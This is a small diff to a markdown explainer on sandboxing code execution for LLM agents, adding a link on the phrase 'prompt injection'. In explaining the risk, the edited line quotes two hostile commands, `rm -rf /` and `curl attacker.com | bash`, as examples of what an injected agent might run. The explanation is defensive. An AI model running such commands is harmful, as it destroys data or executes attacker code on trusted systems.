@@ -18,7 +18,7 @@ Modern sandbox providers offer cloud-hosted microVMs or WebAssembly runtimes tha
 
 **Mental model**: Imagine giving a contractor the key to your house vs giving them access to a specific locked room with only the tools they need. An unsandboxed `subprocess.run()` gives the LLM your house key. A sandbox gives it access to a purpose-built room with no exit.
 
-**Why it matters**: Code execution is the highest-capability tool an agent can have — and therefore the highest risk. A single compromised prompt injection that triggers `rm -rf /` or `curl attacker.com | bash` can cause irreversible damage. Sandboxing makes code execution safe enough to enable in production.
+**Why it matters**: Code execution is the highest-capability tool an agent can have — and therefore the highest risk. A single compromised [prompt injection](../llm_security/README.md) that triggers `rm -rf /` or `curl attacker.com | bash` can cause irreversible damage. Sandboxing makes code execution safe enough to enable in production.
 
 **Key insight**: The security boundary is not about preventing bad code — LLMs write bad code frequently. It is about ensuring that bad code cannot escape its container and affect the host, the network, or other systems.
 
